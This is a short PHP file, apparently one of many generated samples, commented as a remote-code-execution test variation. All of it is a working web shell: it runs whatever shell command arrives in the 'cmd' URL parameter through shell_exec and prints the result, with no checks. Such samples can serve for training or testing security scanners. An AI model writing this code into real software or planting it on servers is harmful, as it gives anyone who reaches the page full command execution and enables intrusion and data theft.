<?php
// RCE test variation #1333
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>